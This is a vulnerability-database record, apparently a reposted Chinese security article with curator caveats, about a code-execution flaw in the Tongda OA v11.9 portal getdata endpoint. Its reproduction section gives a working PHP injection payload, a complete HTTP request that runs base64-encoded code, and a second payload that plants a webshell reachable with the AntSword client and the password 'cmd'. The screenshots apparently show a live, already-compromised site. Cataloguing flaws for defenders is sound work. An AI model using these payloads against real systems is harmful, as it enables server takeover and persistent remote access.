---
source: "MrWQ/vulnerability-paper"
title: "通达OA portal gateway/getdata activeTab代码执行"
product: "通达OA"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "11.9；build/修复缺失"
prerequisites: "有Cookie，最低权限未明"
side_effects: "命令/代码执行示例可能改变主机状态"
review_date: "2026-10-02"
source_url: "https://mp.weixin.qq.com/s/H7LjdR8RXU6Hp5Hen01weQ"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/OA%E5%8A%9E%E5%85%AC/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BE%20OA%20v11.9%20getdata%20%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md"
category_recommendation: "OA / 通达"
id: "vw-a4af48f1ed8dd734d954d43b"
entity_id: "ve-a4af48f1ed8dd734d954d43b"
schema_version: "1"
---

# 通达OA portal gateway/getdata activeTab代码执行

## 条目说明

- 对象与具体问题：通达OA；portal gateway/getdata activeTab代码执行
- 版本、配置及部署条件：11.9；build/修复缺失
- 认证与权限前提：有Cookie，最低权限未明
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- phpinfo只证明PHP代码能力，不直接证明OS命令
- 缺根因、module/id对象前提、修复版本
- 截图被攻陷状态不代表所有版本能力

## 操作风险

命令/代码执行示例可能改变主机状态。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。

## 技术资料与来源记录

> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/H7LjdR8RXU6Hp5Hen01weQ)

**漏洞说明**

通达 OA（Office Anywhere 网络智能办公系统）是由北京通达信科科技有限公司自主研发的协同办公自动化软件，是与中国企业管理实践相结合形成的综合管理办公平台。通达 OA 为各行业不同规模的众多用户提供信息化管理能力，包括流程审批、行政办公、日常事务、数据统计分析、即时通讯、移动办公等，帮助广大用户降低沟通和管理成本，提升生产和决策效率。

通达 OA v11.9 getdata 接口存在任意命令执行漏洞，攻击者通过漏洞可以执行服务器任意命令控制服务器权限

**影响版本**

```
通达OA v11.9

```

**漏洞复现**

![](https://mmbiz.qpic.cn/sz_mmbiz_png/y0627QbVVbUJPUcDoibDQQu0xK9zHwSFuTmNY5kTbyYdVL0ekE1yXbKDABTevHJ0ddQyV75RgmBslx9ibiafpia72A/640?wx_fmt=png)

payload：

```
/general/appbuilder/web/portal/gateway/getdata?activeTab=%E5%27%19,1%3D%3Eeval(base64_decode(%22{bas64命令}%22)))%3B/*&id=19&module=Carouselimage

```

```http
GET /general/appbuilder/web/portal/gateway/getdata?activeTab=%E5%27%19,1%3D%3Eeval(base64_decode(%22cGhwaW5mbygpOw==%22)))%3B/*&id=19&module=Carouselimage HTTP/1.1
Host: ip:port
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.93 Safari/537.36
Accept: */*
Referer: http://ip:port/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=o************************7; KEY_RANDOMDATA=2220
Connection: close

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/y0627QbVVbUJPUcDoibDQQu0xK9zHwSFuBBXXlxOO2JjRd46q0etW7BmoHpomeXibozxey5s68ZCJ7cARUG29sIw/640?wx_fmt=png)

shell 连接：  

```
/general/appbuilder/web/portal/gateway/getdata?activeTab=%E5%27%19,1%3D%3Eeval($_POST[cmd]))%3B/*&id=19&module=Carouselimage

```

使用中国蚁剑进行连接，密码为 cmd

![](https://mmbiz.qpic.cn/sz_mmbiz_png/y0627QbVVbUJPUcDoibDQQu0xK9zHwSFuwbGLeXxDSt7DDzCQ09ib3fchTcicjwocQ3KptsYWFKc7CFXQwlE2vhgQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/y0627QbVVbUJPUcDoibDQQu0xK9zHwSFuQbedX8cYRIHCg24mKvjYiahBmT3elzjhiaMlWrpJhxhD76mMuBWSftPA/640?wx_fmt=png)

可见这个站点已经被人打烂了

**修复建议**  

**升级到安全版本**

本文章仅用于学习交流，不得用于非法用途

星标加关注，追洞不迷路

---

> 来源：MrWQ/vulnerability-paper（https://github.com/MrWQ/vulnerability-paper）
